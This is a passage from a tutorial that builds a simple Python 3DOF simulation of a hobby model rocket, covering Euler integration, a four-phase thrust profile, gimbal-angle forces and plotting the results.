</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>After the time integration, we can return the state variable lists. And that was our 3DOF function. This is the full code for the function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">three_dof_body_axes</span>(Fx, Fz, My, u0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, w0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, theta0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, q0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, pos0<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>], mass<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, inertia<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, g<span style="color:#f92672">=</span><span style="color:#ae81ff">9.81</span>, dt<span style="color:#f92672">=</span><span style="color:#ae81ff">0.01</span>, duration<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ensure pos0 is a float array</span>
</span></span><span style="display:flex;"><span>    pos <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(pos0, dtype<span style="color:#f92672">=</span>float)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># initial conditions</span>
</span></span><span style="display:flex;"><span>    u <span style="color:#f92672">=</span> u0
</span></span><span style="display:flex;"><span>    w <span style="color:#f92672">=</span> w0
</span></span><span style="display:flex;"><span>    theta <span style="color:#f92672">=</span> theta0
</span></span><span style="display:flex;"><span>    q <span style="color:#f92672">=</span> q0
</span></span><span style="display:flex;"><span>    vel <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array([u, w])
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># initial acceleration</span>
</span></span><span style="display:flex;"><span>    ax <span style="color:#f92672">=</span> Fx[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">/</span> mass
</span></span><span style="display:flex;"><span>    az <span style="color:#f92672">=</span> Fz[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">/</span> mass <span style="color:#f92672">-</span> g
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># lists to store values</span>
</span></span><span style="display:flex;"><span>    theta_list <span style="color:#f92672">=</span> [theta]
</span></span><span style="display:flex;"><span>    q_list <span style="color:#f92672">=</span> [q]
</span></span><span style="display:flex;"><span>    dqdt_list <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    pos_list <span style="color:#f92672">=</span> [pos<span style="color:#f92672">.</span>copy()]
</span></span><span style="display:flex;"><span>    velocity_list <span style="color:#f92672">=</span> [vel<span style="color:#f92672">.</span>copy()]
</span></span><span style="display:flex;"><span>    acceleration_list <span style="color:#f92672">=</span> [np<span style="color:#f92672">.</span>array([ax, az])]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># time integration using Euler&#39;s method</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> np<span style="color:#f92672">.</span>arange(dt, duration <span style="color:#f92672">+</span> dt, dt):  <span style="color:#75715e"># start at dt and end at &#39;duration&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># calculate accelerations</span>
</span></span><span style="display:flex;"><span>        ax <span style="color:#f92672">=</span> Fx[int(t<span style="color:#f92672">/</span>dt)] <span style="color:#f92672">/</span> mass
</span></span><span style="display:flex;"><span>        az <span style="color:#f92672">=</span> Fz[int(t<span style="color:#f92672">/</span>dt)] <span style="color:#f92672">/</span> mass <span style="color:#f92672">-</span> g
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># calculate angular acceleration</span>
</span></span><span style="display:flex;"><span>        dqdt <span style="color:#f92672">=</span> My[int(t<span style="color:#f92672">/</span>dt)] <span style="color:#f92672">/</span> inertia
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># calculate velocities and pitch angular rate</span>
</span></span><span style="display:flex;"><span>        u <span style="color:#f92672">+=</span> ax <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>        w <span style="color:#f92672">+=</span> az <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>        q <span style="color:#f92672">+=</span> dqdt <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># calculate positions</span>
</span></span><span style="display:flex;"><span>        pos <span style="color:#f92672">+=</span> vel <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>        vel <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array([u, w])
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># calculate angle</span>
</span></span><span style="display:flex;"><span>        theta <span style="color:#f92672">+=</span> q <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># store data in list</span>
</span></span><span style="display:flex;"><span>        theta_list<span style="color:#f92672">.</span>append(theta)
</span></span><span style="display:flex;"><span>        q_list<span style="color:#f92672">.</span>append(q)
</span></span><span style="display:flex;"><span>        dqdt_list<span style="color:#f92672">.</span>append(dqdt)
</span></span><span style="display:flex;"><span>        pos_list<span style="color:#f92672">.</span>append(pos<span style="color:#f92672">.</span>copy())
</span></span><span style="display:flex;"><span>        velocity_list<span style="color:#f92672">.</span>append(vel<span style="color:#f92672">.</span>copy())
</span></span><span style="display:flex;"><span>        acceleration_list<span style="color:#f92672">.</span>append(np<span style="color:#f92672">.</span>array([ax, az]))
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># stop if the rocket returns to ground level</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pos[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> t <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:  <span style="color:#75715e"># allow some time for launch</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;theta&#39;</span> : np<span style="color:#f92672">.</span>array(theta_list),
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;q&#39;</span> : np<span style="color:#f92672">.</span>array(q_list),
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;dqdt&#39;</span> : np<span style="color:#f92672">.</span>array(dqdt_list),
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;pos&#39;</span> : np<span style="color:#f92672">.</span>array(pos_list),
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;velocity&#39;</span> : np<span style="color:#f92672">.</span>array(velocity_list),
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;acceleration&#39;</span> : np<span style="color:#f92672">.</span>array(acceleration_list)
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h2 id="thrust-profile">Thrust profile</h2>
<p>A rocket simulation will need some way to generate a thrust profile. The thrust profile is just how much thrust is generated at a certain time step. Our rocket will have a peak thrust of $15N$. Since we&rsquo;re trying to model our rocket kinda closely to a real model rocket (not absolutely accurate), we&rsquo;ll need to simulate some of the phases of thrust that will be in a model rocket.</p>
<p>Our rocket will have 4 phases of thrust: Rapid rise, Peak thrust, Decay phase, and Burnout:</p>
<ul>
<li>Rapid rise: In this phase, our rocket will quickly ramps up from $0N$ of thrust to $15N$ of thrust. This phase takes up $10%$ of the thrust duration. We can model this after a quadratic rise, this allows our rocket to gradually start and quickly ramp up as time passes.</li>
<li>Peak thrust: In this phase, our rocket will stay at the peak thrust of $15N$ for the duration of the phase. This phase takes up $20%$ of the thrust duration. Since the thrust value will be constant in this phase, a continous assignment is all that we&rsquo;ll need for this.</li>
<li>Decay phase: In this phase, our rocket will gradually reduce the thrust force from $15N$ to $0N$. This phase takes up $70%$ of the thrust duration. We can model this after a linear decay, which is a good approximation for thrust reduction.</li>
<li>Burnout: In this phase, our rocket&rsquo;s thrust will be $0N$. This happens after the thrust duration.</li>
</ul>
<h2 id="implementing-the-thrust-profile-generation-function">Implementing the thrust profile generation function</h2>
<p>Let&rsquo;s start implementing the thrust profile generation in Python. This function will need the simulation duration, the thrust duration, the peak thrust value, and the time step $dt$:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_thrust_profile</span>(duration, thrust_duration, peak_thrust, dt<span style="color:#f92672">=</span><span style="color:#ae81ff">0.01</span>):
</span></span></code></pre></div><p>We&rsquo;ll need to loop through the duration of the simulation and generate a thrust for each time interval. We&rsquo;ll save the thrust values for each time interval in a thrust profile array:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>thrust_profile <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> np<span style="color:#f92672">.</span>arange(<span style="color:#ae81ff">0</span>, duration <span style="color:#f92672">+</span> dt, dt):
</span></span></code></pre></div><p>First, we&rsquo;ll need to implement the rapid rise phase ($10%$ of total thrust duration):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> t <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.1</span> <span style="color:#f92672">*</span> thrust_duration:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ignition and rapid rise (modeled as quadratic rise)</span>
</span></span><span style="display:flex;"><span>    thrust <span style="color:#f92672">=</span> peak_thrust <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> t <span style="color:#f92672">/</span> thrust_duration)<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>We&rsquo;re basically modeling the quadratic rise here. We multiply the <code>t / thrust_duration</code> with 10 to normalize the data to a range of $[0, 1]$, this is basically the percentage time passed. Then we use the power of 2 to make this equation quadratic and the wholething with <code>peak_thrust</code> to get the thrust at $t$. This will give us a slow increase in the beginning and quick ramp up as time increases.</p>
<p>Next, we&rsquo;ll implement the peak thrust phase ($20%$ of total thrust duration):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> t <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.3</span> <span style="color:#f92672">*</span> thrust_duration:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># peak thrust</span>
</span></span><span style="display:flex;"><span>    thrust <span style="color:#f92672">=</span> peak_thrust
</span></span></code></pre></div><p>This will end at around $30%$ of the full thrust duration, since the rapid rise phase already took up $10%$. There&rsquo;s also no calculation here, we just assign <code>peak_thrust</code> to the <code>thrust</code> variable.</p>
<p>Next, we&rsquo;ll implement the decay phase ($70%$ of total thrust duration):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> t <span style="color:#f92672">&lt;</span> thrust_duration:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># decay phase (modeled as linear decay)</span>
</span></span><span style="display:flex;"><span>    thrust <span style="color:#f92672">=</span> peak_thrust <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> (t <span style="color:#f92672">-</span> <span style="color:#ae81ff">0.3</span> <span style="color:#f92672">*</span> thrust_duration) <span style="color:#f92672">/</span> (<span style="color:#ae81ff">0.7</span> <span style="color:#f92672">*</span> thrust_duration))
</span></span></code></pre></div><p>This is modeled after linear decay. Let&rsquo;s break down each part:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>((t <span style="color:#f92672">-</span> <span style="color:#ae81ff">0.3</span> <span style="color:#f92672">*</span> thrust_duration) <span style="color:#f92672">/</span> (<span style="color:#ae81ff">0.7</span> <span style="color:#f92672">*</span> thrust_duration))
</span></span></code></pre></div><p><code>(t - 0.3 * thrust_duration)</code> gives us the elapsed time since the end of the peak thrust phase, because the peak thrust phase ended at $30%$ of the duration, subtracting that from $t$ will give us the elapsed time.</p>
<p>Then we divide that with <code>(0.7 * thrust_duration)</code> to get the percentage of the elapsed time in the decay phase. Because the decay phase is $70%$ of the duration, and we want to get how long have we been in this decay phase, we divide it with <code>(0.7 * thrust_duration)</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> (t <span style="color:#f92672">-</span> <span style="color:#ae81ff">0.3</span> <span style="color:#f92672">*</span> thrust_duration) <span style="color:#f92672">/</span> (<span style="color:#ae81ff">0.7</span> <span style="color:#f92672">*</span> thrust_duration))
</span></span></code></pre></div><p>We will subtract this division from 1 to invert the value because we want the thrust to gradually decay and we want the value of the division to gradually go down.</p>
<p>Finally, we just multiply this with the peak thrust value to get the thrust at a given time interval $t$ during the decay phase.</p>
<p>Next, we&rsquo;ll implement the burnout phase:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># burnout</span>
</span></span><span style="display:flex;"><span>    thrust <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Then we just append the thrust value to the thrust profile list we initialized earlier and return it. Here&rsquo;s the full function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_thrust_profile</span>(duration, thrust_duration, peak_thrust, dt<span style="color:#f92672">=</span><span style="color:#ae81ff">0.01</span>):
</span></span><span style="display:flex;"><span>    thrust_profile <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> np<span style="color:#f92672">.</span>arange(<span style="color:#ae81ff">0</span>, duration <span style="color:#f92672">+</span> dt, dt):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> t <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.1</span> <span style="color:#f92672">*</span> thrust_duration:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># ignition and rapid rise (modeled as quadratic rise)</span>
</span></span><span style="display:flex;"><span>            thrust <span style="color:#f92672">=</span> peak_thrust <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> t <span style="color:#f92672">/</span> thrust_duration)<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> t <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.3</span> <span style="color:#f92672">*</span> thrust_duration:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># peak thrust</span>
</span></span><span style="display:flex;"><span>            thrust <span style="color:#f92672">=</span> peak_thrust
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> t <span style="color:#f92672">&lt;</span> thrust_duration:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># decay phase (modeled as linear decay)</span>
</span></span><span style="display:flex;"><span>            thrust <span style="color:#f92672">=</span> peak_thrust <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> (t <span style="color:#f92672">-</span> <span style="color:#ae81ff">0.3</span> <span style="color:#f92672">*</span> thrust_duration) <span style="color:#f92672">/</span> (<span style="color:#ae81ff">0.7</span> <span style="color:#f92672">*</span> thrust_duration))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># burnout</span>
</span></span><span style="display:flex;"><span>            thrust <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        thrust_profile<span style="color:#f92672">.</span>append(thrust)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> np<span style="color:#f92672">.</span>array(thrust_profile)
</span></span></code></pre></div><p>Let&rsquo;s test this out by generating a thrust profile and plot it out:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># parameters</span>
</span></span><span style="display:flex;"><span>peak_thrust <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span> <span style="color:#75715e"># N</span>
</span></span><span style="display:flex;"><span>thrust_duration <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#75715e"># s</span>
</span></span><span style="display:flex;"><span>simulation_duration <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span> <span style="color:#75715e"># s</span>
</span></span><span style="display:flex;"><span>dt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.01</span> <span style="color:#75715e"># time step</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># generate thrust profile</span>
</span></span><span style="display:flex;"><span>thrust_profile <span style="color:#f92672">=</span> generate_thrust_profile(simulation_duration, thrust_duration, peak_thrust, dt)
</span></span><span style="display:flex;"><span>time_range <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>arange(<span style="color:#ae81ff">0</span>, simulation_duration <span style="color:#f92672">+</span> dt, dt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># plot the thrust</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>figure(figsize<span style="color:#f92672">=</span>(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>))
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(time_range, thrust_profile, label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Thrust&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># annotate the end of the stages</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>axvline(x<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span> <span style="color:#f92672">*</span> thrust_duration, color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;red&#39;</span>, linestyle<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;--&#39;</span>, label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;End of rapid rise&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>axvline(x<span style="color:#f92672">=</span><span style="color:#ae81ff">0.3</span> <span style="color:#f92672">*</span> thrust_duration, color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;green&#39;</span>, linestyle<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;--&#39;</span>, label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;End of peak thrust&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>axvline(x<span style="color:#f92672">=</span>thrust_duration, color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;orange&#39;</span>, linestyle<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;--&#39;</span>, label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;End of decay phase (Burnout)&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;Thrust (N)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;Thrust Profile&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>grid()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>show()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/thrust-profile.png"  alt="Thrust profile drop off"  class="center"  style="padding: 10px"  />


<p>We can see that the rapid rise phase starts out slowly but ramps up very quickly, the peak thrust phase is constant, and the decay phase is linear. So our function is working just fine.</p>
<p>Now that we have our thrust profile generation function, we can finally move on to using it to calculate our rocket&rsquo;s dynamics and simulate it.</p>
<h2 id="making-the-simulation">Making the simulation</h2>
<p>First, we&rsquo;ll need to initialize some parameters (using the values we measured before) and setup the initial condition of the rocket. We&rsquo;ll have a thrust peak value of $15N$ and a thrust duration of 4 seconds. We&rsquo;ll also set the simulation timeframe to 30 seconds:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># parameters</span>
</span></span><span style="display:flex;"><span>mass <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.543</span> <span style="color:#75715e"># kg</span>
</span></span><span style="display:flex;"><span>inertia <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.048</span> <span style="color:#75715e"># kg*m^2</span>
</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> <span style="color:#ae81ff">9.81</span> <span style="color:#75715e"># m/s^2</span>
</span></span><span style="display:flex;"><span>peak_thrust <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span> <span style="color:#75715e"># N</span>
</span></span><span style="display:flex;"><span>thrust_duration <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#75715e"># s</span>
</span></span><span style="display:flex;"><span>simulation_duration <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span> <span style="color:#75715e"># s</span>
</span></span><span style="display:flex;"><span>dt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.01</span> <span style="color:#75715e"># time step</span>
</span></span><span style="display:flex;"><span>moment_arm <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.28</span> <span style="color:#75715e"># meters</span>
</span></span><span style="display:flex;"><span>gimbal_angle <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.00</span> <span style="color:#75715e"># radian</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># initial conditions</span>
</span></span><span style="display:flex;"><span>u0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span> <span style="color:#75715e"># initial velocity in x (body axis)</span>
</span></span><span style="display:flex;"><span>w0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span> <span style="color:#75715e"># initial velocity in z (body axis)</span>
</span></span><span style="display:flex;"><span>theta0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span> <span style="color:#75715e"># initial pitch angle</span>
</span></span><span style="display:flex;"><span>q0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span> <span style="color:#75715e"># initial pitch rate</span>
</span></span><span style="display:flex;"><span>pos0 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>] <span style="color:#75715e"># initial position [x, z]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># generate thrust profile</span>
</span></span><span style="display:flex;"><span>thrust_profile <span style="color:#f92672">=</span> generate_thrust_profile(simulation_duration, thrust_duration, peak_thrust, dt)
</span></span></code></pre></div><p>Note on the <code>gimbal_angle</code> variable, I initialized this to $0rad$ for now. This will be the angle of the thruster gimbal. We&rsquo;ll see how changing this value will affect the rocket later on. A gimbal angle of 0 will shoot the rocket straight up.</p>
<p>Next, we&rsquo;ll need to calculate the force on the X and Z axes along with the torque based on the thrust profile:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># initialize forces and moments</span>
</span></span><span style="display:flex;"><span>Fx <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>sin(gimbal_angle) <span style="color:#f92672">*</span> thrust_profile <span style="color:#75715e"># horizontal thrust</span>
</span></span><span style="display:flex;"><span>Fz <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>cos(gimbal_angle) <span style="color:#f92672">*</span> thrust_profile <span style="color:#75715e"># vertical thrust</span>
</span></span><span style="display:flex;"><span>My <span style="color:#f92672">=</span> Fx <span style="color:#f92672">*</span> moment_arm <span style="color:#75715e"># pitching moment (torque)</span>
</span></span></code></pre></div><p>This is some simple trigonometry to calculate the horizontal and vertical thrust of a rocket. Let&rsquo;s try to visualize this.</p>

    <img src="/img/tvc-modeling/fx-fz-trig.png"  alt="Forces and thrust trigonometry visualization"  class="center"  style="padding: 10px"  />


<p>This is how the forces on the X and Z axes can be visualized based on the thrust direction, with $\theta$ being the gimbal angle. With this visualization, we can see how trigonometry can be applied to this problemto calculate the forces on the X and Z axes. By using the <em>soh cah toa</em> rule, we can get these 2 equations:</p>
<p>$$
\sin(\theta) = \frac{F_x}{T}, \ \cos(\theta) = \frac{F_z}{T}
$$</p>
<p>Reordering the equations will give us these new equations:</p>
<p>$$
F_x = \sin(\theta) * T, \ F_z = \cos(\theta) * T
$$</p>
<p>For the torque, we can just multiply the force applied to the rocket in the X axis with the moment arm because the horizontal thrust will generate a moment around the rocket&rsquo;s center of mass (this is used to control the pitch, that&rsquo;s why it&rsquo;s called pitching moment)</p>
<p>We finally have all the necessary values to plug into our 3DOF function. We&rsquo;ll also extract the position, velocity and acceleration results into a variable and initialize a <code>time</code> variable for plotting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>results <span style="color:#f92672">=</span> three_dof_body_axes(Fx, Fz, My, u0, w0, theta0, q0, pos0, mass, inertia, g, dt, simulation_duration)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>arange(<span style="color:#ae81ff">0</span>, len(results[<span style="color:#e6db74">&#39;pos&#39;</span>]) <span style="color:#f92672">*</span> dt, dt)
</span></span><span style="display:flex;"><span>pos <span style="color:#f92672">=</span> results[<span style="color:#e6db74">&#39;pos&#39;</span>]
</span></span><span style="display:flex;"><span>velocity <span style="color:#f92672">=</span> results[<span style="color:#e6db74">&#39;velocity&#39;</span>]
</span></span><span style="display:flex;"><span>acceleration <span style="color:#f92672">=</span> results[<span style="color:#e6db74">&#39;acceleration&#39;</span>]
</span></span></code></pre></div><h3 id="plotting-the-simulation-data-with-no-gimbal-angle">Plotting the simulation data with no gimbal angle</h3>
<p>Let&rsquo;s plot all these results out to see how our rocket performed. We&rsquo;ll plot out the data on the Z axis first:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># plot data (Z axis)</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>figure(figsize<span style="color:#f92672">=</span>(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>subplot(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(time, pos[:, <span style="color:#ae81ff">1</span>], label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Z Position&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;Z Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;Z Position Data&#39;</span>)
